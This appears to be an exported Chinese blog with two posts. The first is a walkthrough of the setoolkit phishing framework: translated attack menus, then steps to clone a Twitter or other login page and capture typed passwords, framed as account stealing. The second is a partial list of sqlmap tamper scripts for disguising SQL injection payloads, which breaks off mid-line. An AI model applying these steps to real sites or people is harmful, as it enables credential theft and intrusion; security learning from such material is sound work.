<div class="note info simple"><p>我同学今天说了一下你会盗号不，这个问题真的不好回答，现在大部分盗号都是社工钓鱼，没有那种直接用什么方法黑入到管理用户密码的地方毕竟是方法的不能这样做对吧！</p>
</div>

<h1 id="安装setoolkit"><a href="#安装setoolkit" class="headerlink" title="安装setoolkit"></a>安装setoolkit</h1><div class="note info simple"><p>kali默认是安装setoolkit了的</p>
</div>



<div class="note info simple"><p>其他的linux安装</p>
</div>

<p>项目地址<a href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a></p>
<p><strong>安装</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/  <span class="comment">#克隆库</span></span><br><span class="line"><span class="built_in">cd</span> setoolkit  <span class="comment"># 进入下载的目录</span></span><br><span class="line">pip3 install -r requirements.txt  <span class="comment"># 下载依赖</span></span><br><span class="line">python setup.py  <span class="comment"># 安装</span></span><br></pre></td></tr></table></figure>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>启动命令<code>setoolkit</code><br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410084855579.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410094056198.png" alt="image-20210410094056198"></p>
<div class="note info simple"><p>这个软件都是英文的我看不懂，下面是我好长时间的翻译，用的翻译软件翻译的，有的可能不准见谅</p>
</div>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">   1) Social-Engineering Attacks <span class="comment">#  社会工程攻击</span></span><br><span class="line">   2) Penetration Testing (Fast-Track)  <span class="comment"># 渗透测试（快速跟踪）</span></span><br><span class="line">   3) Third Party Modules   <span class="comment"># 第三方模块</span></span><br><span class="line">   4) Update the Social-Engineer Toolkit <span class="comment"># 更新Social-Engineer工具包</span></span><br><span class="line">   5) Update SET configuration <span class="comment"># 更新SET配置</span></span><br><span class="line">   6) Help, Credits, and About <span class="comment">#帮助，积分和关于</span></span><br><span class="line"></span><br><span class="line">  99) Exit the Social-Engineer Toolkit  <span class="comment">#退出社交工程师工具包</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; </span><br></pre></td></tr></table></figure>



<h2 id="社会工程攻击"><a href="#社会工程攻击" class="headerlink" title="社会工程攻击"></a>社会工程攻击</h2>   <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">   1) Spear-Phishing Attack Vectors <span class="comment">#鱼叉式网络钓鱼攻击向量</span></span><br><span class="line">   2) Website Attack Vectors <span class="comment">#网站攻击向量</span></span><br><span class="line">   3) Infectious Media Generator <span class="comment">#传染性媒体生成器</span></span><br><span class="line">   4) Create a Payload and Listener <span class="comment">#创建有效载荷和侦听器</span></span><br><span class="line">   5) Mass Mailer Attack <span class="comment">#群发邮件攻击</span></span><br><span class="line">   6) Arduino-Based Attack Vector <span class="comment">#基于Arduino的攻击向量</span></span><br><span class="line">   7) Wireless Access Point Attack Vector <span class="comment">#无线接入点攻击向量</span></span><br><span class="line">   8) QRCode Generator Attack Vector <span class="comment">#QRCode生成器攻击向量</span></span><br><span class="line">   9) Powershell Attack Vectors <span class="comment">#Powershell攻击向量</span></span><br><span class="line">  10) Third Party Modules <span class="comment">#第三方模块</span></span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu. <span class="comment">#返回主菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt; </span><br></pre></td></tr></table></figure>
<h3 id="鱼叉式网络钓鱼攻击向量"><a href="#鱼叉式网络钓鱼攻击向量" class="headerlink" title="鱼叉式网络钓鱼攻击向量"></a>鱼叉式网络钓鱼攻击向量</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">   1) Perform a Mass Email Attack <span class="comment">#进行大规模电子邮件攻击</span></span><br><span class="line">   2) Create a FileFormat Payload  <span class="comment">#创建FileFormat有效负载</span></span><br><span class="line">   3) Create a Social-Engineering Template <span class="comment">#创建一个社会工程模板</span></span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu <span class="comment">#返回主菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:phishing&gt;</span><br></pre></td></tr></table></figure>
<h4 id="进行大规模电子邮件攻击"><a href="#进行大规模电子邮件攻击" class="headerlink" title="进行大规模电子邮件攻击"></a>进行大规模电子邮件攻击</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   1) SET Custom Written DLL Hijacking Attack Vector (RAR, ZIP) <span class="comment">#SET自定义书面DLL劫持攻击向量（RAR，ZIP）</span></span><br><span class="line">   2) SET Custom Written Document UNC LM SMB Capture Attack <span class="comment">#SET自定义书面文档UNC LM SMB捕获攻击</span></span><br><span class="line">   3) MS15-100 Microsoft Windows Media Center MCL Vulnerability <span class="comment">#MS15-100 Microsoft Windows Media Center MCL漏洞</span></span><br><span class="line">   4) MS14-017 Microsoft Word RTF Object Confusion (2014-04-01) <span class="comment">#MS14-017 Microsoft Word RTF对象混乱（2014-04-01）</span></span><br><span class="line">   5) Microsoft Windows CreateSizedDIBSECTION Stack Buffer  Overflow <span class="comment">#Microsoft Windows CreateSizedDIBSECTION堆栈缓冲区溢出</span></span><br><span class="line">   6) Microsoft Word RTF pFragments Stack Buffer Overflow (MS10-087) <span class="comment"># Microsoft Word RTF pFragments堆栈缓冲区溢出（MS10-087）</span></span><br><span class="line">   7) Adobe Flash Player <span class="string">&quot;Button&quot;</span> Remote Code Execution <span class="comment">#Adobe Flash Player“按钮”远程执行代码</span></span><br><span class="line">   8) Adobe CoolType SING Table <span class="string">&quot;uniqueName&quot;</span> Overflow <span class="comment">#Adobe CoolType SING表“ uniqueName”溢出</span></span><br><span class="line">   9) Adobe Flash Player <span class="string">&quot;newfunction&quot;</span> Invalid Pointer Use <span class="comment">#Adobe Flash Player“ newfunction”无效的指针使用＃</span></span><br><span class="line">  10) Adobe Collab.collectEmailInfo Buffer Overflow <span class="comment">#Adobe Collab.collectEmailInfo缓冲区溢出＃</span></span><br><span class="line">  11) Adobe Collab.getIcon Buffer Overflow <span class="comment">#Adobe Collab.getIcon缓冲区溢出＃</span></span><br><span class="line">  12) Adobe JBIG2Decode Memory Corruption Exploit <span class="comment"># Adobe JBIG2Decode内存损坏漏洞利用</span></span><br><span class="line">  13) Adobe PDF Embedded EXE Social Engineering <span class="comment">#Adobe PDF Embedded EXE社会工程＃</span></span><br><span class="line">  14) Adobe util.printf() Buffer Overflow <span class="comment">#Adobe util.printf（）缓冲区溢出</span></span><br><span class="line">  15) Custom EXE to VBA (sent via RAR) (RAR required) <span class="comment"># 自定义EXE到VBA（通过RAR发送）（需要RAR）＃</span></span><br><span class="line">  16) Adobe U3D CLODProgressiveMeshDeclaration Array Overrun <span class="comment">#Adobe U3D CLODProgressiveMeshDeclaration数组溢出＃</span></span><br><span class="line">  17) Adobe PDF Embedded EXE Social Engineering (NOJS) <span class="comment">#Adobe PDF Embedded EXE社会工程（NOJS）＃</span></span><br><span class="line">  18) Foxit PDF Reader v4.1.1 Title Stack Buffer Overflow <span class="comment">#Foxit PDF Reader v4.1.1标题堆栈缓冲区溢出</span></span><br><span class="line">  19) Apple QuickTime PICT PnSize Buffer Overflow <span class="comment">#苹果QuickTime PICT PnSize缓冲区溢出</span></span><br><span class="line">  20) Nuance PDF Reader v6.0 Launch Stack Buffer Overflow <span class="comment"># Nuance PDF Reader v6.0启动堆栈缓冲区溢出</span></span><br><span class="line">  21) Adobe Reader u3D Memory Corruption Vulnerability <span class="comment">#Adobe Reader u3D内存损坏漏洞＃</span></span><br><span class="line">  22) MSCOMCTL ActiveX Buffer Overflow (ms12-027) <span class="comment">#MSCOMCTL ActiveX缓冲区溢出（ms12-027）＃</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:payloads&gt;</span><br></pre></td></tr></table></figure>


<h3 id="网页攻击向量"><a href="#网页攻击向量" class="headerlink" title="网页攻击向量"></a>网页攻击向量</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">   1) Java Applet Attack Method <span class="comment">#Java Applet攻击方法</span></span><br><span class="line">   2) Metasploit Browser Exploit Method <span class="comment">#Metasploit浏览器利用方法</span></span><br><span class="line">   3) Credential Harvester Attack Method  <span class="comment">#钓鱼网站攻击</span></span><br><span class="line">   4) Tabnabbing Attack Method  <span class="comment">#标签钓鱼攻击</span></span><br><span class="line">   5) Web Jacking Attack Method  <span class="comment">#Web Jacking攻击方法</span></span><br><span class="line">   6) Multi-Attack Web Method <span class="comment">#多攻击Web方法</span></span><br><span class="line">   7) HTA Attack Method <span class="comment">#HTA攻击方法</span></span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu <span class="comment">#返回主菜单</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span>:webattack&gt;</span><br></pre></td></tr></table></figure>
<h4 id="JavaApplet攻击方法"><a href="#JavaApplet攻击方法" class="headerlink" title="JavaApplet攻击方法"></a>JavaApplet攻击方法</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">   1) Web Templates <span class="comment">#网页模板</span></span><br><span class="line">   2) Site Cloner <span class="comment">#网站克隆</span></span><br><span class="line">   3) Custom Import <span class="comment">#自定义导入</span></span><br><span class="line"></span><br><span class="line">  99) Return to Webattack Menu <span class="comment">#返回网络攻击菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt;</span><br></pre></td></tr></table></figure>
<h4 id="Metasploit浏览器利用方法"><a href="#Metasploit浏览器利用方法" class="headerlink" title="Metasploit浏览器利用方法"></a>Metasploit浏览器利用方法</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">   1) Web Templates <span class="comment">#网页模板</span></span><br><span class="line">   2) Site Cloner <span class="comment">#网站克隆</span></span><br><span class="line">   3) Custom Import <span class="comment">#自定义导入</span></span><br><span class="line"></span><br><span class="line">  99) Return to Webattack Menu <span class="comment">#返回网络攻击菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:webattack&gt;</span><br></pre></td></tr></table></figure>
<h4 id="网站攻击向量模块下面都是一样的"><a href="#网站攻击向量模块下面都是一样的" class="headerlink" title="网站攻击向量模块下面都是一样的"></a>网站攻击向量模块下面都是一样的</h4><h3 id="传染性媒体生成器"><a href="#传染性媒体生成器" class="headerlink" title="传染性媒体生成器"></a>传染性媒体生成器</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">   1) File-Format Exploits <span class="comment">#文件格式漏洞</span></span><br><span class="line">   2) Standard Metasploit Executable <span class="comment">#标准Metasploit可执行代码</span></span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu <span class="comment">#返回主菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:infectious&gt;</span><br></pre></td></tr></table></figure>


<h3 id="创建有效载荷和侦听器"><a href="#创建有效载荷和侦听器" class="headerlink" title="创建有效载荷和侦听器"></a>创建有效载荷和侦听器</h3><p>没有什么参数</p>
<h3 id="群发邮件攻击"><a href="#群发邮件攻击" class="headerlink" title="群发邮件攻击"></a>群发邮件攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">    1.  E-Mail Attack Single Email Address <span class="comment">#电子邮件攻击单个电子邮件地址</span></span><br><span class="line">    2.  E-Mail Attack Mass Mailer <span class="comment">#电子邮件攻击群发邮件</span></span><br><span class="line"></span><br><span class="line">    99. Return to main menu. <span class="comment">#返回主菜单</span></span><br><span class="line">   </span><br><span class="line"><span class="built_in">set</span>:mailer&gt;</span><br></pre></td></tr></table></figure>
<h3 id="基于Arduino的攻击向量"><a href="#基于Arduino的攻击向量" class="headerlink" title="基于Arduino的攻击向量"></a>基于Arduino的攻击向量</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   1) Powershell HTTP GET MSF Payload <span class="comment">#Powershell HTTP GET MSF有效负载</span></span><br><span class="line">   2) WSCRIPT HTTP GET MSF Payload <span class="comment">#WSCRIPT HTTP GET MSF有效负载</span></span><br><span class="line">   3) Powershell based Reverse Shell Payload <span class="comment">#基于Powershell的反向Shell有效负载</span></span><br><span class="line">   4) Internet Explorer/FireFox Beef Jack Payload <span class="comment">#nternet Explorer / FireFox牛肉杰克有效载荷</span></span><br><span class="line">   5) Go to malicious java site and accept applet Payload <span class="comment"># 转到恶意Java网站并接受小程序有效载荷</span></span><br><span class="line">   6) Gnome wget Download Payload <span class="comment"># Gnome wget下载有效载荷</span></span><br><span class="line">   7) Binary 2 Teensy Attack (Deploy MSF payloads) <span class="comment">#Binary 2 Teensy Attack（部署MSF有效负载）</span></span><br><span class="line">   8) SDCard 2 Teensy Attack (Deploy Any EXE) <span class="comment">#SDCard 2 Teensy Attack（部署任何EXE</span></span><br><span class="line">   9) SDCard 2 Teensy Attack (Deploy on OSX) <span class="comment"># SDCard 2 Teensy Attack（部署在OSX上）</span></span><br><span class="line">  10) X10 Arduino Sniffer PDE and Libraries <span class="comment"># X10 Arduino Sniffer PDE和库</span></span><br><span class="line">  11) X10 Arduino Jammer PDE and Libraries <span class="comment">#X10 Arduino Jammer PDE和库</span></span><br><span class="line">  12) Powershell Direct ShellCode Teensy Attack <span class="comment">#Powershell直接ShellCode Teensy攻击</span></span><br><span class="line">  13) Peensy Multi Attack Dip Switch + SDCard Attack <span class="comment"># Peensy多点攻击拨码开关+ SDCard攻击</span></span><br><span class="line">  14) HID Msbuild compile to memory Shellcode Attack <span class="comment">#HID Msbuild编译到内存Shellcode Attack</span></span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu <span class="comment">#返回主菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:arduino&gt;</span><br></pre></td></tr></table></figure>
<h3 id="无线接入点攻击向量"><a href="#无线接入点攻击向量" class="headerlink" title="无线接入点攻击向量"></a>无线接入点攻击向量</h3><p>没有什么参数</p>
<h3 id="QRCode生成器攻击向量"><a href="#QRCode生成器攻击向量" class="headerlink" title="QRCode生成器攻击向量"></a>QRCode生成器攻击向量</h3><p>没有什么参数</p>
<h3 id="Powershell攻击向量"><a href="#Powershell攻击向量" class="headerlink" title="Powershell攻击向量"></a>Powershell攻击向量</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">   1) Powershell Alphanumeric Shellcode Injector <span class="comment">#Powershell字母数字Shellcode注入器</span></span><br><span class="line">   2) Powershell Reverse Shell <span class="comment">#Powershell反向外壳</span></span><br><span class="line">   3) Powershell Bind Shell <span class="comment">#Powershell绑定外壳</span></span><br><span class="line">   4) Powershell Dump SAM Database <span class="comment">#Powershell转储SAM数据库</span></span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu <span class="comment">#返回主菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:powershell&gt;</span><br></pre></td></tr></table></figure>
<h3 id="第三方模块"><a href="#第三方模块" class="headerlink" title="第三方模块"></a>第三方模块</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">  1. RATTE (Remote Administration Tool Tommy Edition) Create Payload only. Read the readme/RATTE-Readme.txt first <span class="comment">#RATTE（远程管理工具Tommy版）仅创建有效负载。 首先阅读自述文件/RATTE-Readme.txt</span></span><br><span class="line">  2. RATTE Java Applet Attack (Remote Administration Tool Tommy Edition) - Read the readme/RATTE_README.txt first <span class="comment">#RATTE Java Applet攻击（远程管理工具Tommy版）-首先阅读自述文件/RATTE_README.txt</span></span><br><span class="line">  3. Google Analytics Attack by @ZonkSec <span class="comment">#RATTE Java Applet攻击（远程管理工具Tommy版）-首先阅读自述文件/RATTE_README.txt</span></span><br><span class="line"></span><br><span class="line">  99. Return to the previous menu <span class="comment">#返回上一个菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:modules&gt;</span><br></pre></td></tr></table></figure>
<h2 id="渗透测试（快速跟踪）"><a href="#渗透测试（快速跟踪）" class="headerlink" title="渗透测试（快速跟踪）"></a>渗透测试（快速跟踪）</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">   1) Microsoft SQL Bruter <span class="comment">#Microsoft SQL Bruter</span></span><br><span class="line">   2) Custom Exploits <span class="comment"># 自定义漏洞 </span></span><br><span class="line">   3) SCCM Attack Vector <span class="comment">#SCCM攻击向量</span></span><br><span class="line">   4) Dell DRAC/Chassis Default Checker <span class="comment">#Dell DRAC /机箱默认检查器</span></span><br><span class="line">   5) RID_ENUM - User Enumeration Attack <span class="comment">#RID_ENUM-用户枚举攻击</span></span><br><span class="line">   6) PSEXEC Powershell Injection  <span class="comment">#PSEXEC Powershell注入</span></span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu <span class="comment">#返回主菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:fasttrack&gt;</span><br></pre></td></tr></table></figure>




<h3 id="Microsoft-SQL-Bruter"><a href="#Microsoft-SQL-Bruter" class="headerlink" title="Microsoft SQL Bruter"></a>Microsoft SQL Bruter</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">   1) Scan and Attack MSSQL <span class="comment">#扫描和攻击MSSQL</span></span><br><span class="line">   2) Connect directly to MSSQL <span class="comment">#直接连接到MSSQL</span></span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu <span class="comment">#返回主菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:fasttrack:mssql&gt;</span><br></pre></td></tr></table></figure>
<h3 id="自定义漏洞"><a href="#自定义漏洞" class="headerlink" title="自定义漏洞"></a>自定义漏洞</h3><p>没有什么参数</p>
<h3 id="SCCM攻击向量"><a href="#SCCM攻击向量" class="headerlink" title="SCCM攻击向量"></a>SCCM攻击向量</h3><p>没有什么参数</p>
<h3 id="Dell-DRAC-机箱默认检查器"><a href="#Dell-DRAC-机箱默认检查器" class="headerlink" title="Dell DRAC /机箱默认检查器"></a>Dell DRAC /机箱默认检查器</h3><p>没有什么参数</p>
<h3 id="RID-ENUM-用户枚举攻击"><a href="#RID-ENUM-用户枚举攻击" class="headerlink" title="RID_ENUM-用户枚举攻击"></a>RID_ENUM-用户枚举攻击</h3><p>没有什么参数</p>
<h3 id="PSEXEC-Powershell注入"><a href="#PSEXEC-Powershell注入" class="headerlink" title="PSEXEC Powershell注入"></a>PSEXEC Powershell注入</h3><p>没有什么参数</p>
<h2 id="第三方模块-1"><a href="#第三方模块-1" class="headerlink" title="第三方模块"></a>第三方模块</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">  1. RATTE (Remote Administration Tool Tommy Edition) Create Payload only. Read the readme/RATTE-Readme.txt first <span class="comment">#RATTE（远程管理工具Tommy版）仅创建有效负载。 首先阅读自述文件/RATTE-Readme.txt</span></span><br><span class="line">  2. RATTE Java Applet Attack (Remote Administration Tool Tommy Edition) - Read the readme/RATTE_README.txt first <span class="comment">#RATTE Java Applet攻击（远程管理工具Tommy版）-首先阅读自述文件/RATTE_README.txt</span></span><br><span class="line">  3. Google Analytics Attack by @ZonkSec <span class="comment">#RATTE Java Applet攻击（远程管理工具Tommy版）-首先阅读自述文件/RATTE_README.txt</span></span><br><span class="line"></span><br><span class="line">  99. Return to the previous menu <span class="comment">#返回上一个菜单</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:modules&gt;</span><br></pre></td></tr></table></figure>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="用他自带web钓鱼盗号"><a href="#用他自带web钓鱼盗号" class="headerlink" title="用他自带web钓鱼盗号"></a>用他自带web钓鱼盗号</h2><div class="note info simple"><p>用社会工程攻击模块</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410104449658.png" alt="image-20210410104449658"></p>
<div class="note info simple"><p>选择网页攻击</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410105533647.png" alt="image-20210410105533647"></p>
<div class="note info simple"><p>选择钓鱼网站攻击</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410110245654.png" alt="image-20210410110245654"></p>
<div class="note info simple"><p>选择网页模板</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410110354418.png" alt="image-20210410110354418"></p>
<div class="note info simple"><p>然后输入本地IP</p>
</div>





<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410110443920.png" alt="image-20210410110443920"></p>
<div class="note info simple"><p>选择钓鱼网站模块，我选择的是Twitter</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410110618794.png" alt="image-20210410110618794"></p>
<div class="note info simple"><p>然后我们访问他个自己添加的ip地址</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410110902593.png" alt="image-20210410110902593"></p>
<div class="note info simple"><p>然后输入用户密码，然后在终端就可以看见了</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410111009828.png" alt="image-20210410111009828"></p>
<div class="note info simple"><p>这样用户密码就盗取到了</p>
</div>


<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410111216904.png" alt="image-20210410111216904"></p>
<h2 id="登录网页克隆钓鱼盗号"><a href="#登录网页克隆钓鱼盗号" class="headerlink" title="登录网页克隆钓鱼盗号"></a>登录网页克隆钓鱼盗号</h2><div class="note info simple"><p>用社会工程攻击模块</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410104449658.png" alt="image-20210410104449658"></p>
<div class="note info simple"><p>选择网页攻击</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410105533647.png" alt="image-20210410105533647"></p>
<div class="note info simple"><p>选择钓鱼网站攻击</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410110245654.png" alt="image-20210410110245654"></p>
<div class="note info simple"><p>选择网站克隆</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410154111165.png" alt="image-20210410154111165"></p>
<div class="note info simple"><p>然后在填写自己的ip用来网页的访问</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410154251301.png" alt="image-20210410154251301"></p>
<div class="note info simple"><p>然后输入要克隆登录的地址</p>
</div>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410154935044.png" alt="image-20210410154935044"><br><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410154853304.png" alt="image-20210410154853304"></p>
<div class="note info simple"><p>然后我们输入自己的IP就可以访问这个钓鱼用的登录网址了</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410155055859.png" alt="image-20210410155055859"></p>
<div class="note info simple"><p>我随便输入一个密码</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410155131781.png" alt="image-20210410155131781"></p>
<div class="note info simple"><p>可以看见输入的用户密码</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410155312207.png" alt="image-20210410155312207"></p>
<h2 id="生成URL二维码"><a href="#生成URL二维码" class="headerlink" title="生成URL二维码"></a>生成URL二维码</h2><div class="note info simple"><p>用社会工程攻击模块</p>
</div>





<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410104449658.png" alt="image-20210410104449658"></p>
<div class="note info simple"><p>QRCode生成器攻击向量</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410104657036.png" alt="image-20210410104657036"></p>
<div class="note info simple"><p>然后输入URL地址</p>
</div>

<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410104901372.png" alt="image-20210410104901372"></p>
<div class="note info simple"><p>他就会访到这个目录里面</p>
</div>



<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410104945756.png" alt="image-20210410104945756"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/wzass/zp/image-20210410105010116.png" alt="image-20210410105010116"></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>setoolkit</category>
      </categories>
      <tags>
        <tag>社工setoolkit</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap Tamper脚本</title>
    <url>/2020/09/13/sqlmap%20Tamper%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>官方<a href="http://sqlmap.org/">http://sqlmap.org/</a></p>
<h2 id="sqlmap脚本介绍"><a href="#sqlmap脚本介绍" class="headerlink" title="sqlmap脚本介绍"></a>sqlmap脚本介绍</h2><p>sqlmap的脚步都在下面的文件夹里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200913112418130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="在这个博客有脚本的分类"><a href="#在这个博客有脚本的分类" class="headerlink" title="在这个博客有脚本的分类"></a>在这个博客有脚本的分类</h3><p><a href="https://blog.csdn.net/whatday/article/details/54774043">https://blog.csdn.net/whatday/article/details/54774043</a></p>
<h3 id="脚本的作用"><a href="#脚本的作用" class="headerlink" title="脚本的作用"></a>脚本的作用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apostrophemask.py-用其UTF-8全角字符替换撇号（&#39;）（例如&#39;-&gt;％EF％BC％87）</span><br><span class="line">apostrophenullencode.py-用非法的双unicode替换撇号（&#39;）（例如&#39;-&gt;％00％27）</span><br><span class="line">appendnullbyte.py-在有效载荷的末尾附加（访问）NULL字节字符（％00）</span><br><span class="line">base64encode.py-Base64对给定有效载荷中的所有字符进行编码</span><br><span class="line">between.py- 替换较大比运算符（&#39;&gt;&#39;）带有&#39;NOT BETWEEN 0 AND＃&#39;，等于运算符（&#39;&#x3D;&#39;）与&#39;BETWEEN＃AND＃&#39;</span><br><span class="line">bluecoat.py-用有效的随机空白字符替换SQL语句后的空格字符。然后用运算符LIKE替换字符&#39;&#x3D;&#39;</span><br><span class="line">chardoubleencode.py-双重URL编码给定有效负载中的所有字符（未处理已编码）（例如SELECT-&gt;％2553％2545％254C％2545％2543％2554）</span><br><span class="line">charencode.py-URL编码中的所有字符给定的有效载荷（不处理已经编码的）（例如SELECT-&gt;％53％45％4C％45％43％54）</span><br><span class="line">charunicodeencode.py-Unicode-URL编码给定的有效载荷中的所有字符（不处理已经编码的）（例如SELECT-&gt;％u0053％u0045％u004C％u0045％u0043％u0054）</span><br><span class="line">charunicodeescape.py-Unicode转义给定有效负载中的未编码字符（未处理已编码的字符）（例如SELECT-&gt; \ u0053 \ u0045 \ u004C \ u0045 \ u0043 \ u0054）</span><br><span class="line">commalesslimit.py-用&#39;LIMIT N OFFSET M&#39;替换（MySQL）实例，例如&#39;LIMIT M，N&#39;</span><br><span class="line">commalessmid.py-用&#39;MID（A FROM B FOR C）&#39;替换（MySQL）实例，例如&#39;MID（A，B，C）&#39;</span><br><span class="line">commentbeforeparentheses.py-在括号前加（内联）注释（例如（（-&gt; &#x2F; ** &#x2F;（）</span><br><span class="line">concat2concatws.py-用&#39;CONCAT_WS（MID（CHAR（0），0，0），A，B）&#39; 等价物（相当于）替换（MySQL）实例，例如&#39;CONCAT（A，B）&#39; 。</span><br><span class="line">equaltolike.py- 将所有出现的等于（&#39;&#x3D;&#39;）运算符替换为&#39;LIKE&#39;</span><br><span class="line">escapequotes.py-斜杠转义单引号和双引号（例如&#39;-&gt; \&#39;）</span><br><span class="line">great.py- 替换大于运算符（&#39;&gt;&#39; ）和&#39;GREATEST&#39;对应</span><br><span class="line">Halfversionedmorekeywords.py-在每个关键字</span><br><span class="line">hex2char.py-替换每个（MySQL）0x等效的CONCAT（CHAR（），...）编码字符串</span><br><span class="line">htmlencode.py-HTML编码（使用代码点）所有非字母数字字符（例如&#39;-&gt;&#39;）</span><br><span class="line">ifnull2casewhenisnull.py-替换&#39;IFNULL（ A，B）&#39;与&#39;CASE WHEN ISNULL（A）THEN（B）ELSE（A）END&#39;对应</span><br><span class="line">ifnull2ifisnull.py-用&#39;IF（ISNULL（A），B）替换&#39;IFNULL（A，B）&#39;之类的实例，A）&#39;对应</span><br><span class="line">informationschemacomment.py-在所有出现的（MySQL）“ information_schema”标识符的末尾添加一个内联注释（&#x2F; ** &#x2F;）</span><br><span class="line">least.py 用&#39;LEAST&#39;对应替换大于运算符（&#39;&gt;&#39;）</span><br><span 